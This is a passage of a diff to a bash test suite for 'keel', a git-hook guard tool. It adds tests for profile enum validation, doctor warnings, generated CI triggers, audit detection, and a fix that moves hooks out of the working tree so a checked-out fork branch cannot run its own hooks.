     printf '  SKIP  shellcheck is absent, so the generated pre-commit hook was not linted\n'
 fi
@@ -4340,7 +4897,7 @@ pc="$(fixture bare)"
 ( cd "$pc" && "$KEEL" init -y >/dev/null 2>&1 )
 ( cd "$pc" && "$KEEL" guard install >/dev/null 2>&1 )
 ( cd "$pc" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
-pc_out="$( cd "$pc" && PATH="$storeshim3:$PATH" .githooks/pre-commit 2>&1 )"
+pc_out="$( cd "$pc" && PATH="$storeshim3:$PATH" .git/hooks/pre-commit 2>&1 )"
 case "$pc_out" in
   *"python3 is absent"*) ok "the pre-commit guard reports python3 as absent for a Store-alias shim, rather than silently skipping" ;;
   *) bad "commit guard" "a required gate went unchecked with no explanation printed. Got: $pc_out" ;;
@@ -4348,7 +4905,7 @@ esac
 rm -rf "$pc" "$storeshim3"
 
 ( cd "$c" && "$KEEL" guard uninstall >/dev/null 2>&1 )
-[ ! -e "$c/.githooks/pre-commit" ] && ok "guard uninstall removes the pre-commit hook too" \
+[ ! -e "$c/.git/hooks/pre-commit" ] && ok "guard uninstall removes the pre-commit hook too" \
   || bad "commit guard" "the pre-commit hook survived uninstall"
 rm -rf "$c"
 
@@ -4356,8 +4913,8 @@ rm -rf "$c"
 tv="$(fixture bare)"
 ( cd "$tv" && "$KEEL" init -y >/dev/null 2>&1 )
 ( cd "$tv" && "$KEEL" guard install >/dev/null 2>&1 )
-[ -x "$tv/.githooks/prepare-commit-msg" ] && ok "guard install writes an executable prepare-commit-msg hook" \
-  || bad "guard" "no executable .githooks/prepare-commit-msg"
+[ -x "$tv/.git/hooks/prepare-commit-msg" ] && ok "guard install writes an executable prepare-commit-msg hook" \
+  || bad "guard" "no executable .git/hooks/prepare-commit-msg"
 
 ( cd "$tv" && "$KEEL" guard status 2>&1 | grep -qi "message guard" ) \
   && ok "guard status reports the message guard as well as the push and commit guards" \
@@ -4385,15 +4942,15 @@ count="$(printf '%s\n' "$msg2" | grep -c '^Keel-Version:')"
 # never parses it. Linting the generated file, the same pattern the existing pre-push and
 # pre-commit shellcheck tests use, is the only way this code gets checked at all.
 if command -v shellcheck >/dev/null 2>&1; then
-    shellcheck -s bash "$tv/.githooks/prepare-commit-msg" >/dev/null 2>&1 \
+    shellcheck -s bash "$tv/.git/hooks/prepare-commit-msg" >/dev/null 2>&1 \
       && ok "the generated prepare-commit-msg hook is shellcheck clean" \
-      || bad "guard" "shellcheck flagged prepare-commit-msg: $(shellcheck -s bash "$tv/.githooks/prepare-commit-msg" 2>&1 | head -3)"
+      || bad "guard" "shellcheck flagged prepare-commit-msg: $(shellcheck -s bash "$tv/.git/hooks/prepare-commit-msg" 2>&1 | head -3)"
 else
     printf '  SKIP  shellcheck is absent, so the generated prepare-commit-msg hook was not linted\n'
 fi
 
 ( cd "$tv" && "$KEEL" guard uninstall >/dev/null 2>&1 )
-[ ! -e "$tv/.githooks/prepare-commit-msg" ] && ok "guard uninstall removes the prepare-commit-msg hook too" \
+[ ! -e "$tv/.git/hooks/prepare-commit-msg" ] && ok "guard uninstall removes the prepare-commit-msg hook too" \
   || bad "guard" "prepare-commit-msg survived uninstall"
 rm -rf "$tv"
 
@@ -4871,7 +5428,7 @@ json.dump(d, open(p,"w"), indent=2)
 DOWNGRADE
 ( cd "$w" && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
 got="$(python3 -c 'import json,sys;d=json.load(open(sys.argv[1]));print(d.get("schema_version"), json.dumps(d.get("harnesses")))' "$w/.keel/profile.json")"
-[ "$got" = '4 ["claude"]' ] && ok "a schema 2 profile upgrades to claude only" \
+[ "$got" = '5 ["claude"]' ] && ok "a schema 2 profile upgrades to claude only" \
   || bad "a schema 2 profile upgrades to claude only" "got $got"
 rm -rf "$w"
 
@@ -5249,8 +5806,8 @@ PY
   || bad "init writes none of the six retired keys" "still written: $left"
 
 sv="$(python3 -c "import json;print(json.load(open('$wr/.keel/profile.json'))['schema_version'])")"
-[ "$sv" = "4" ] && ok "init writes schema version 4" \
-  || bad "init writes schema version 4" "got $sv"
+[ "$sv" = "5" ] && ok "init writes schema version 5" \
+  || bad "init writes schema version 5" "got $sv"
 
 # The floor for the first case. What it covers is a profile that parses but carries a gates object
 # missing keys: that would satisfy "none of the six are present" while breaking every gate that
@@ -5269,6 +5826,683 @@ PY
 [ -z "$kept" ] && ok "init still writes the five gates that survive" \
   || bad "init still writes the five gates that survive" "missing: $kept"
 rm -rf "$wr"
+
+# ---- profile set checks a value against the schema's enum ---------------------------------------
+# A gate holding a typo reads as a weaker gate: hooks/done-guard treats anything that is not `off`
+# or `required` as `warn`. So a value the schema does not list is refused where it is typed.
+pe="$(fixture node-ts)"
+( cd "$pe" && "$KEEL" init -y >/dev/null 2>&1 )
+out="$( cd "$pe" && "$KEEL" profile set gates.done_verified requird 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && ok "profile set refuses a gate value outside the schema enum" \
+  || bad "profile set enum" "exit $rc for gates.done_verified requird"
+case "$out" in
+  *required*warn*off*) ok "the enum refusal names the accepted values" ;;
+  *) bad "profile set enum" "refusal did not list required, warn, off: '$out'" ;;
+esac
+got="$(prof_of "$pe" gates.done_verified)"
+[ "$got" = "warn" ] && ok "the refused enum value was not written" \
+  || bad "profile set enum" "gates.done_verified is '$got', not the init default warn"
+( cd "$pe" && "$KEEL" profile set gates.done_verified required >/dev/null 2>&1 ) \
+  && ok "profile set still accepts a value the enum lists" \
+  || bad "profile set enum" "refused gates.done_verified required"
+( cd "$pe" && "$KEEL" profile set project.kind null >/dev/null 2>&1 ) \
+  && ok "profile set still accepts null on an enum key, which clears it" \
+  || bad "profile set enum" "refused null for project.kind"
+rm -rf "$pe"
+
+# ---- doctor fails a value outside the schema's enum ---------------------------------------------
+# profile set now refuses one, but a hand edit or an older keel can still write it, and doctor is
+# where a project is told its profile means something other than it reads.
+de="$(fixture node-ts)"
+( cd "$de" && "$KEEL" init -y >/dev/null 2>&1 )
+seed_standards "$de"
+out="$( cd "$de" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"which is not one of"*) bad "doctor enum" "a fresh init profile was reported out of enum: $out" ;;
+  *) ok "doctor reports no enum problem on a profile init wrote" ;;
+esac
+python3 - "$de/.keel/profile.json" <<'PY'
+import json, sys
+p = json.load(open(sys.argv[1]))
+p["gates"]["security_audit"] = "reqired"
+json.dump(p, open(sys.argv[1], "w"), indent=2)
+PY
+out="$( cd "$de" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"FAIL  gates.security_audit is 'reqired', which is not one of required, warn, off"*)
+    ok "doctor fails a gate value outside the schema enum" ;;
+  *) bad "doctor enum" "no FAIL for gates.security_audit: $(printf '%s\n' "$out" | grep -n security_audit)" ;;
+esac
+# The weaker-gate clause is true only of a gate: said of project.kind or a convention it tells the
+# reader something enforces less when nothing enforces that key at all.
+case "$(printf '%s\n' "$out" | grep 'gates.security_audit is')" in
+  *"for a gate that means a weaker one"*) ok "doctor's enum FAIL on a gate says it reads as a weaker one" ;;
+  *) bad "doctor enum" "the gate FAIL lost its weaker-gate clause: $(printf '%s\n' "$out" | grep security_audit)" ;;
+esac
+python3 - "$de/.keel/profile.json" <<'PY'
+import json, sys
+p = json.load(open(sys.argv[1]))
+p["gates"]["security_audit"] = "required"
+p["conventions"]["response_style"] = "tersee"
+json.dump(p, open(sys.argv[1], "w"), indent=2)
+PY
+out="$( cd "$de" && "$KEEL" doctor --fast 2>&1 )"
+line="$(printf '%s\n' "$out" | grep 'conventions.response_style is' || true)"
+case "$line" in
+  *"for a gate"*) bad "doctor enum" "a non-gate key's FAIL claims a weaker gate: $line" ;;
+  *"FAIL  conventions.response_style is 'tersee', which is not one of terse, verbose"*"keel profile set conventions.response_style"*)
+    ok "doctor's enum FAIL on a non-gate key names no gate" ;;
+  *) bad "doctor enum" "no FAIL for conventions.response_style: $line" ;;
+esac
+
+# A schema doctor cannot read means the enum check did not run, and saying only "profile parses"
+# reads as a profile that passed it. A copy of keel with its schema removed stands in for a broken
+# install, since doctor resolves the schema from its own directory and the repo's must stay intact.
+dk="$(mktemp -d)"
+cp -R "$ROOT/bin" "$ROOT/lib" "$ROOT/templates" "$ROOT/VERSION" "$dk/"
+rm "$dk/templates/profile.schema.json"
+out="$( cd "$de" && "$dk/bin/keel" doctor --fast 2>&1 )"
+case "$out" in
+  *"WARN  the profile schema at"*"could not be read"*) ok "doctor warns when the profile schema cannot be read" ;;
+  *) bad "doctor noschema" "no WARN for an unreadable schema: $out" ;;
+esac
+case "$out" in
+  *"FAIL  "*"which is not one of"*) bad "doctor noschema" "an enum FAIL with no schema: $out" ;;
+  *"FAIL  "*"could not check the profile"*) bad "doctor noschema" "the noschema line was read as an error: $out" ;;
+  *) ok "doctor raises no enum FAIL when the schema cannot be read" ;;
+esac
+rm -rf "$dk"
+rm -rf "$de"
+
+# ---- generated CI triggers on the recorded default branch ---------------------------------------
+# write_ci hardcoded `branches: [main]`, so a master repository got a workflow that never ran on a
+# push to its own default branch, while the profile beside it said master.
+mb="$(mktemp -d)"
+( cd "$mb" && git init -q -b master . && git config user.email t@t.t && git config user.name t \
+  && printf '{"name":"f","scripts":{"test":"jest"}}\n' > package.json \
+  && git add package.json && git commit -qm init && "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(prof_of "$mb" conventions.default_branch)" = master ] \
+  || bad "write_ci branch" "fixture precondition: profile did not record master"
+grep -q 'branches: \[master\]' "$mb/.github/workflows/ci.yml" \
+  && ok "generated CI runs on the default branch the profile records" \
+  || bad "write_ci branch" "workflow trigger: $(grep -n 'branches' "$mb/.github/workflows/ci.yml")"
+rm -rf "$mb"
+
+# The same master repository with python3 unavailable (the Windows Store alias shim, which
+# have_python reads as absent). write_ci reads the branch through json_get, which needs python3,
+# while write_profile records it with printf, so the profile said master and the workflow fell
+# back to main.
+mbn="$(mktemp -d)"
+storeshim4="$(mktemp -d)"
+cat > "$storeshim4/python3" <<'SHIM'
+#!/bin/sh
+printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
+exit 49
+SHIM
+chmod +x "$storeshim4/python3"
+( cd "$mbn" && git init -q -b master . && git config user.email t@t.t && git config user.name t \
+  && printf '{"name":"f","scripts":{"test":"jest"}}\n' > package.json \
+  && git add package.json && git commit -qm init \
+  && PATH="$storeshim4:$PATH" "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(prof_of "$mbn" conventions.default_branch)" = master ] \
+  || bad "write_ci branch" "fixture precondition without python3: profile did not record master"
+grep -q 'branches: \[master\]' "$mbn/.github/workflows/ci.yml" \
+  && ok "generated CI runs on the recorded default branch without python3" \
+  || bad "write_ci branch" "workflow trigger without python3: $(grep -n 'branches' "$mbn/.github/workflows/ci.yml")"
+rm -rf "$mbn" "$storeshim4"
+
+# ---- doctor reports whether the push guard is installed ------------------------------------------
+# protect_default_branch is true by default and only the push guard enforces it outside a session,
+# and init does not install the guard. Nothing said so until this line.
+pg="$(fixture node-ts)"
+( cd "$pg" && "$KEEL" init -y >/dev/null 2>&1 )
+seed_standards "$pg"
+out="$( cd "$pg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"WARN  conventions.protect_default_branch is not false and the push guard is not installed"*)
+    ok "doctor warns when the push guard is not installed" ;;
+  *) bad "doctor guard" "no guard warning without an install: $(printf '%s\n' "$out" | grep -in guard)" ;;
+esac
+( cd "$pg" && "$KEEL" guard install >/dev/null 2>&1 )
+out="$( cd "$pg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"ok    push guard installed"*) ok "doctor reports an installed push guard as ok" ;;
+  *) bad "doctor guard" "no ok line after guard install: $(printf '%s\n' "$out" | grep -in guard)" ;;
+esac
+rm -rf "$pg"
+
+# The hook protects on anything that is not false, the absent key included (the schema default is
+# true), so doctor must report the guard on exactly those values: a line that stays quiet where the
+# hook refuses, or speaks where it allows, describes a guard that is not the one installed.
+pg="$(fixture node-ts)"
+( cd "$pg" && "$KEEL" init -y >/dev/null 2>&1 )
+seed_standards "$pg"
+( cd "$pg" && "$KEEL" profile set conventions.protect_default_branch false >/dev/null 2>&1 )
+out="$( cd "$pg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"push guard"*) bad "doctor guard" "a guard line with protect_default_branch false: $(printf '%s\n' "$out" | grep -in 'push guard')" ;;
+  *) ok "doctor says nothing about the push guard when protect_default_branch is false" ;;
+esac
+python3 -c "import json;p='$pg/.keel/profile.json';j=json.load(open(p));del j['conventions']['protect_default_branch'];json.dump(j,open(p,'w'),indent=2)"
+out="$( cd "$pg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"WARN  conventions.protect_default_branch is not false and the push guard is not installed"*)
+    ok "doctor warns about the push guard when protect_default_branch is absent, as the hook enforces it" ;;
+  *) bad "doctor guard" "no guard warning with the key absent: $(printf '%s\n' "$out" | grep -in 'push guard')" ;;
+esac
+# The hook's sed reads the string "false" as empty and refuses the push, so doctor must warn. This
+# pins the sed read: a json_get read with `!= false` passes the cases above and prints nothing here.
+python3 -c "import json;p='$pg/.keel/profile.json';j=json.load(open(p));j['conventions']['protect_default_branch']='false';json.dump(j,open(p,'w'),indent=2)"
+out="$( cd "$pg" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"WARN  conventions.protect_default_branch is not false and the push guard is not installed"*)
+    ok "doctor warns about the push guard when protect_default_branch is the string \"false\", as the hook enforces it" ;;
+  *) bad "doctor guard" "no guard warning with the key the string \"false\": $(printf '%s\n' "$out" | grep -in 'push guard')" ;;
+esac
+rm -rf "$pg"
+
+# ---- the message hook honours conventions.no_attribution_footers ---------------------------------
+# A trailer is a footer, and a repository that declares it wants none gets none.
+nf="$(fixture bare)"
+( cd "$nf" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 )
+# Without the hook the case below passes over nothing, so its absence is a failure of its own.
+[ -x "$nf/.git/hooks/prepare-commit-msg" ] \
+  || bad "no footers" "fixture precondition: guard install wrote no prepare-commit-msg hook"
+python3 - "$nf/.keel/profile.json" <<'PY'
+import json, sys
+p = json.load(open(sys.argv[1]))
+p["conventions"]["no_attribution_footers"] = True
+json.dump(p, open(sys.argv[1], "w"), indent=2)
+PY
+( cd "$nf" && git add -A && git commit -q -m "no footer wanted" )
+# Both halves can pass the case below over nothing: with no hooks path the hook never runs, and a
+# commit that failed leaves the fixture's own init commit on top, which carries no trailer either.
+[ -z "$(git -C "$nf" config core.hooksPath)" ] \
+  || bad "no footers" "fixture precondition: core.hooksPath is set, so .git/hooks does not run"
+[ "$(git -C "$nf" log -1 --format=%s)" = "no footer wanted" ] \
+  || bad "no footers" "fixture precondition: the commit did not happen"
+msg="$( cd "$nf" && git log -1 --format=%B )"
+case "$msg" in
+  *Keel-Version*) bad "no footers" "the trailer was added although no_attribution_footers is true: $msg" ;;
+  *) ok "the message hook adds no trailer when conventions.no_attribution_footers is true" ;;
+esac
+rm -rf "$nf"
+
+# ---- guard status says what the message hook will do -------------------------------------------
+# The message guard line must describe the hook as installed, and a hook body is fixed at install
+# time: one written before the hook read conventions.no_attribution_footers still adds the trailer.
+gs="$(fixture bare)"
+( cd "$gs" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 )
+# Without the hook or the hooks path, status never reaches the message guard line and the cases
+# below fail for a reason they do not name, so each absence is a failure of its own.
+[ -x "$gs/.git/hooks/prepare-commit-msg" ] \
+  || bad "guard status" "fixture precondition: guard install wrote no prepare-commit-msg hook"
+[ -z "$(git -C "$gs" config core.hooksPath)" ] \
+  || bad "guard status" "fixture precondition: core.hooksPath is set, so .git/hooks does not run"
+# The first case is about the key absent, so a profile that already carries it proves nothing.
+! grep -q no_attribution_footers "$gs/.keel/profile.json" \
+  || bad "guard status" "fixture precondition: a fresh profile already carries no_attribution_footers"
+mg="$( cd "$gs" && "$KEEL" guard status 2>&1 | grep '^message guard:' )"
+[ "$mg" = "message guard: active. commits get a Keel-Version trailer" ] \
+  && ok "guard status keeps the Keel-Version trailer line when conventions.no_attribution_footers is absent" \
+  || bad "guard status" "with the key absent the message guard line was: $mg"
+python3 - "$gs/.keel/profile.json" <<'PY'
+import json, sys
+p = json.load(open(sys.argv[1]))
+p["conventions"]["no_attribution_footers"] = True
+json.dump(p, open(sys.argv[1], "w"), indent=2)
+PY
+mg="$( cd "$gs" && "$KEEL" guard status 2>&1 | grep '^message guard:' )"
+case "$mg" in
+  *"adds no trailer"*) ok "guard status says the message guard adds no trailer when conventions.no_attribution_footers is true" ;;
+  *) bad "guard status" "with the key true the message guard line was: $mg" ;;
+esac
+# A hook body from before the key: the same file with every line that reads the key taken out.
+sed '/no_attribution_footers/d;/footers/d' "$gs/.git/hooks/prepare-commit-msg" > "$gs/old-hook"
+cat "$gs/old-hook" > "$gs/.git/hooks/prepare-commit-msg"
+rm -f "$gs/old-hook"
+[ -x "$gs/.git/hooks/prepare-commit-msg" ] \
+  || bad "guard status" "fixture precondition: the replaced hook is not executable"
+! grep -q no_attribution_footers "$gs/.git/hooks/prepare-commit-msg" \
+  || bad "guard status" "fixture precondition: the replaced hook still reads no_attribution_footers"
+mg="$( cd "$gs" && "$KEEL" guard status 2>&1 | grep '^message guard:' )"
+case "$mg" in
+  *"installed before conventions.no_attribution_footers"*"Re-run 'keel guard install'"*)
+    ok "guard status tells a hook from before conventions.no_attribution_footers to be reinstalled" ;;
+  *) bad "guard status" "with an old hook and the key true the message guard line was: $mg" ;;
+esac
+rm -rf "$gs"
+
+# ---- guard status says what the push hook scans ------------------------------------------------
+# A hook body is fixed at install time, and one written before `keel scan --push` scans the working
+# tree, not the commits being pushed. status called it active all the same.
+gs="$(fixture bare)"
+( cd "$gs" && "$KEEL" guard install >/dev/null 2>&1 )
+pg="$( cd "$gs" && "$KEEL" guard status 2>&1 | grep '^push guard:' )"
+[ "$pg" = "push guard: active" ] \
+  && ok "guard status calls a hook that scans the pushed commits active" \
+  || bad "guard status" "with a current hook the push guard line was: $pg"
+# A hook body from before --push: the same file with every line that runs it taken out.
+sed '/scan --push/d' "$gs/.git/hooks/pre-push" > "$gs/old-hook"
+cat "$gs/old-hook" > "$gs/.git/hooks/pre-push"
+rm -f "$gs/old-hook"
+pg="$( cd "$gs" && "$KEEL" guard status 2>&1 | grep '^push guard:' )"
+case "$pg" in
+  *"scans the working tree"*"Re-run 'keel guard install'"*) ok "guard status tells a hook that scans the working tree to be reinstalled" ;;
+  *) bad "guard status" "with a hook from before --push the push guard line was: $pg" ;;
+esac
+rm -rf "$gs"
+
+# ---- verify.security is detected from a JavaScript lockfile --------------------------------------
+# write_ci mapped the package manager to an audit and never told the profile, so doctor and ship
+# saw no security command on any project. Only with the lockfile the audit reads: npm audit exits
+# non-zero without one.
+sl="$(fixture node-ts)"; printf '{"lockfileVersion": 3}\n' > "$sl/package-lock.json"
+( cd "$sl" && "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(verify_of "$sl" security)" = "npm audit --audit-level=high" ] \
+  && ok "init detects verify.security from a package-lock.json" \
+  || bad "verify.security" "got '$(verify_of "$sl" security)'"
+grep -q 'name: security' "$sl/.github/workflows/ci.yml" \
+  && ok "generated CI runs verify.security as its own step" \
+  || bad "verify.security" "no security step in the generated workflow"
+[ "$(grep -c 'npm audit --audit-level=high' "$sl/.github/workflows/ci.yml")" -eq 1 ] \
+  && ok "generated CI runs the audit once, as the security step" \
+  || bad "verify.security" "audit steps: $(grep -n 'audit' "$sl/.github/workflows/ci.yml" | tr '\n' ' ')"
+seed_standards "$sl"
+out="$( cd "$sl" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"ok    verify.security set (not run, --fast)"*) ok "doctor --fast names verify.security without running it" ;;
+  *) bad "verify.security" "no --fast line: $(printf '%s\n' "$out" | grep -n 'verify.security')" ;;
+esac
+rm -rf "$sl"
+sn="$(fixture node-ts)"
+( cd "$sn" && "$KEEL" init -y >/dev/null 2>&1 )
+[ -z "$(verify_of "$sn" security)" ] && ok "no lockfile means no verify.security" \
+  || bad "verify.security" "detected '$(verify_of "$sn" security)' with no lockfile"
+seed_standards "$sn"
+out="$( cd "$sn" && "$KEEL" doctor --fast 2>&1 )"
+case "$out" in
+  *"ok    verify.security is null: keel detects one only from an npm, pnpm or yarn 2+ lockfile"*)
+    ok "a null verify.security is an ok line, not a warning" ;;
+  *) bad "verify.security" "null line: $(printf '%s\n' "$out" | grep -n 'verify.security')" ;;
+esac
+rm -rf "$sn"
+# `yarn npm audit` exists only on yarn 2 and later, and yarn 1 answers it with `Command "npm" not
+# found`, so a classic lockfile gets no command and full doctor does not fail on every yarn 1 project.
+sy="$(fixture node-ts)"; printf '# yarn lockfile v1\n' > "$sy/yarn.lock"
+( cd "$sy" && "$KEEL" init -y >/dev/null 2>&1 )
+[ -z "$(verify_of "$sy" security)" ] && ok "a yarn 1 lockfile means no verify.security" \
+  || bad "verify.security" "detected '$(verify_of "$sy" security)' from a yarn 1 lockfile"
+rm -rf "$sy"
+sy="$(fixture node-ts)"; printf '__metadata:\n  version: 8\n' > "$sy/yarn.lock"
+( cd "$sy" && "$KEEL" init -y >/dev/null 2>&1 )
+[ "$(verify_of "$sy" security)" = "yarn npm audit --severity high" ] \
+  && ok "a yarn 2+ lockfile detects yarn npm audit" \
+  || bad "verify.security" "yarn 2+ lockfile: got '$(verify_of "$sy" security)'"
+rm -rf "$sy"
+# A security command that is not the audit, such as a code scanner, runs beside the dependency
+# audit and does not replace it. init writes CI only when there is none, so the second init, after
+# the workflow is removed, is the one that reads the hand-set command.
+sd="$(fixture node-ts)"; printf '{"lockfileVersion": 3}\n' > "$sd/package-lock.json"
+( cd "$sd" && "$KEEL" init -y >/dev/null 2>&1 \
+  && "$KEEL" profile set verify.security 'echo scan' >/dev/null 2>&1 \
+  && rm -rf .github && "$KEEL" init -y >/dev/null 2>&1 )
+grep -q 'run: echo scan' "$sd/.github/workflows/ci.yml" \
+  && grep -q 'run: npm audit --audit-level=high' "$sd/.github/workflows/ci.yml" \
+  && ok "generated CI keeps the audit beside a different verify.security" \
+  || bad "verify.security" "run steps: $(grep 'run:' "$sd/.github/workflows/ci.yml" | tr '\n' ' ')"
+rm -rf "$sd"
+
+# ---- a checkout cannot run a branch's own hooks --------------------------------------------------
+# The guard used core.hooksPath=.githooks, a path inside the working tree, so every checkout
+# replaced the hooks with the checked-out branch's own, and a fork's pull request ran its code the
+# moment anyone checked it out. The guard now lives in git's hooks directory, which no checkout
+# writes. Reproduced on git 2.50.1 before the fix.
+xh="$(fixture node-ts)"
+( cd "$xh" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 )
+[ -x "$xh/.git/hooks/pre-push" ] \
+  || bad "guard location" "fixture precondition: guard install wrote no .git/hooks/pre-push"
+( cd "$xh" && git checkout -q -b fork-pr && mkdir -p .githooks \
+  && printf '#!/bin/sh\ntouch "%s/checkout-ran-a-branch-hook"\n' "$xh" > .githooks/post-checkout \
+  && chmod +x .githooks/post-checkout && git add .githooks \
+  && git commit -q --no-verify -m "a branch that ships its own hook" \
+  && git checkout -q - && git checkout -q fork-pr ) >/dev/null 2>&1
+[ -e "$xh/.githooks/post-checkout" ] \
+  || bad "guard location" "fixture precondition: the branch's hook file is not checked out"
+# The positive control: without it, a checkout that silently failed would leave no hook to run and
+# pass the assertion below for the wrong reason.
+[ "$(git -C "$xh" rev-parse --abbrev-ref HEAD)" = fork-pr ] \
+  || bad "guard location" "fixture precondition: HEAD is '$(git -C "$xh" rev-parse --abbrev-ref HEAD)', not fork-pr"
+[ ! -e "$xh/checkout-ran-a-branch-hook" ] \
+  && ok "checking out a branch does not run that branch's own hooks" \
+  || bad "guard location" "a checked-out branch's .githooks/post-checkout ran"
+rm -rf "$xh"
+
+# ---- an install at the old .githooks path is recognised and moved --------------------------------
+# Every guard installed before 2026-09-26 sits in .githooks with core.hooksPath pointing there.
+# status must say so, and install must move it rather than leave both.
+lg="$(fixture node-ts)"
+( cd "$lg" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 \
+  && mkdir -p .githooks \
+  && mv .git/hooks/pre-push .git/hooks/pre-commit .git/hooks/prepare-commit-msg .githooks/ \
+  && git config core.hooksPath .githooks )
+out="$( cd "$lg" && "$KEEL" guard status 2>&1 )"; rc=$?
+case "$out" in
+  *"working-tree path"*) [ "$rc" -ne 0 ] && ok "guard status names an install at .githooks and exits non-zero" \
+                           || bad "guard legacy" "status named it but exited 0" ;;
+  *) bad "guard legacy" "status did not name the .githooks install: $out" ;;
+esac
+( cd "$lg" && "$KEEL" guard install >/dev/null 2>&1 )
+[ -z "$(git -C "$lg" config core.hooksPath)" ] && [ -x "$lg/.git/hooks/pre-push" ] \
+  && ok "guard install moves a .githooks install into .git/hooks and unsets core.hooksPath" \
+  || bad "guard legacy" "after install: core.hooksPath='$(git -C "$lg" config core.hooksPath)', pre-push $( [ -x "$lg/.git/hooks/pre-push" ] && echo present || echo missing )"
+( cd "$lg" && "$KEEL" guard status >/dev/null 2>&1 ) \
+  && ok "guard status is 0 once the .githooks install is moved" \
+  || bad "guard legacy" "status non-zero after the move"
+rm -rf "$lg"
+
+# ---- another tool's hooks are never taken over ---------------------------------------------------
+# A core.hooksPath keel did not set belongs to husky, lefthook or a global scanner; replacing it
+# switches that tool's hooks off. A same-named hook file in .git/hooks is another tool's too.
+# install refuses both, and leaves them exactly as they were.
+fp="$(fixture node-ts)"
+( cd "$fp" && "$KEEL" init -y >/dev/null 2>&1 && git config core.hooksPath .husky )
+( cd "$fp" && "$KEEL" guard install >/dev/null 2>&1 ) \
+  && bad "guard foreign" "install exited 0 with core.hooksPath pointing at .husky" \
+  || ok "guard install refuses while core.hooksPath points at another tool's hooks"
+[ "$(git -C "$fp" config core.hooksPath)" = ".husky" ] && [ ! -e "$fp/.git/hooks/pre-push" ] \
+  && ok "the refused install leaves core.hooksPath and .git/hooks untouched" \
+  || bad "guard foreign" "core.hooksPath='$(git -C "$fp" config core.hooksPath)', pre-push $( [ -e "$fp/.git/hooks/pre-push" ] && echo written || echo absent )"
+out="$( cd "$fp" && "$KEEL" guard status 2>&1 )"
+case "$out" in
+  *"which keel did not set"*) ok "guard status names a foreign core.hooksPath" ;;
+  *) bad "guard foreign" "status: $out" ;;
+esac
+rm -rf "$fp"
+fh="$(fixture node-ts)"
+( cd "$fh" && "$KEEL" init -y >/dev/null 2>&1 \
+  && printf '#!/bin/sh\n# another tool\nexit 0\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit )
+( cd "$fh" && "$KEEL" guard install >/dev/null 2>&1 ) \
+  && bad "guard foreign" "install exited 0 over another tool's pre-commit" \
+  || ok "guard install refuses to overwrite another tool's hook"
+grep -q 'another tool' "$fh/.git/hooks/pre-commit" && [ ! -e "$fh/.git/hooks/pre-push" ] \
+  && ok "the refused install leaves the other tool's hook in place and writes nothing" \
+  || bad "guard foreign" "the other tool's pre-commit was replaced, or pre-push was written"
+out="$( cd "$fh" && "$KEEL" guard status 2>&1 )"
+case "$out" in
+  *"pre-commit is another tool's hook"*) ok "guard status names another tool's pre-commit" ;;
+  *) bad "guard foreign" "status with a foreign pre-commit: $out" ;;
+esac
+rm -rf "$fh"
+# .githooks is also a common name for a project's own committed hooks. Without keel's mark it is
+# theirs, and install must not unset core.hooksPath as if it were keel's old install.
+ph="$(fixture node-ts)"
+( cd "$ph" && "$KEEL" init -y >/dev/null 2>&1 && mkdir -p .githooks \
+  && printf '#!/bin/sh\n# the project own hook\nexit 0\n' > .githooks/pre-commit \
+  && chmod +x .githooks/pre-commit && git config core.hooksPath .githooks )
+( cd "$ph" && "$KEEL" guard install >/dev/null 2>&1 ) \
+  && bad "guard foreign" "install exited 0 over a project's own .githooks" \
+  || ok "guard install refuses a .githooks that holds a project's own hooks"
+[ "$(git -C "$ph" config core.hooksPath)" = ".githooks" ] \
+  && grep -q 'the project own hook' "$ph/.githooks/pre-commit" \
+  && ok "the project's own .githooks stays in core.hooksPath, untouched" \
+  || bad "guard foreign" "core.hooksPath='$(git -C "$ph" config core.hooksPath)', or .githooks/pre-commit was replaced"
+rm -rf "$ph"
+
+# ---- a legacy move never switches off hooks that are not keel's ---------------------------------
+# A fixture holding keel's old install: the three hooks in .githooks, core.hooksPath pointing there.
+# Each case below takes its own, so one case's install cannot decide another's result.
+legacy_fixture() {
+    local r; r="$(fixture node-ts)"
+    ( cd "$r" && "$KEEL" init -y >/dev/null 2>&1 && "$KEEL" guard install >/dev/null 2>&1 \
+      && mkdir -p .githooks \
+      && mv .git/hooks/pre-push .git/hooks/pre-commit .git/hooks/prepare-commit-msg .githooks/ \
+      && git config core.hooksPath .githooks )
+    printf '%s' "$r"
+}
+# A .githooks holding keel's pre-push can hold the project's own commit-msg beside it. Unsetting
+# core.hooksPath to move keel's three would stop that one running too, so install refuses instead.
+lo="$(legacy_fixture)"
+printf '#!/bin/sh\n# the project own commit-msg\nexit 0\n' > "$lo/.githooks/commit-msg"
+chmod +x "$lo/.githooks/commit-msg"
+out="$( cd "$lo" && "$KEEL" guard install 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && [ "$(git -C "$lo" config core.hooksPath)" = ".githooks" ] \
+  && grep -q 'the project own commit-msg' "$lo/.githooks/commit-msg" \
+  && ok "guard install refuses to move a .githooks install that also holds another hook" \
+  || bad "guard legacy" "rc=$rc, core.hooksPath='$(git -C "$lo" config core.hooksPath)': $out"
+case "$out" in
+  *"holds commit-msg"*) ok "the refusal names the hook that would stop running" ;;
+  *) bad "guard legacy" "the refusal did not name commit-msg: $out" ;;
+esac
+rm -rf "$lo"
